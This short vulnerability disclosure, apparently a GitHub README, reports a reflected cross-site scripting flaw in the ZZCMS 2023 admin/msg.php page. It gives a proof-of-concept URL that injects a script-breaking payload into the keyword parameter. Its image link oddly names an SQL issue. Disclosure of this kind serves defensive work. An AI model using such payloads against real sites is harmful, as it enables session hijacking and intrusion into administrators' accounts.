# zzcms-msg-xss

## Supplier

```
http://www.zzcms.net/
```

## Description



ZZCMS 2023 version has an XSS vulnerability in admin/msg.php



## POC

Admin logs in to the backend to access



```
http://127.0.0.1:8888/admin/msg.php?action=pass&&keyword=';alert(1);//
```



![image-20241108174935128](./images/zzcms-add_list-sql.asserts/image-20241108174935128.png)





